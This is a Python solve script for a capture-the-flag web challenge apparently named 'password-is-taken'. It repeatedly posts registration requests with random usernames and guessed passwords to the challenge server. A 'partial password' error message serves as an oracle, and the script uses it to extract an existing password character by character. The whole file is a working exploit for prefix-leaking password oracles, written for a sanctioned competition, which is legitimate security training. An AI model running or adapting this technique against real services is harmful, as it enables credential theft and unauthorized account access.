import requests
import os
import base64
import json
import string

# remote = "http://localhost:1337"
remote = "https://password-is-taken.chal.fallctf.com"
register_url = f"{remote}/register"


def check_password(password):
    data = {
        "username": base64.b64encode(os.urandom(32)),
        "password": password,
    }

    r = requests.post(register_url, data=data)
    data = r.json()
    status = data["status"]

    if status != 400:
        return False

    error_data = json.dumps(data["data"])
    if "partial password" in error_data:
        return True

    return False


password = ""
letters = string.ascii_letters + string.digits

while True:
    for c in letters:
        password_guess = password + c
        if check_password(password_guess):
            password = password_guess
            print(password)
            break
    else:
        break

print("Final Password: ", password)
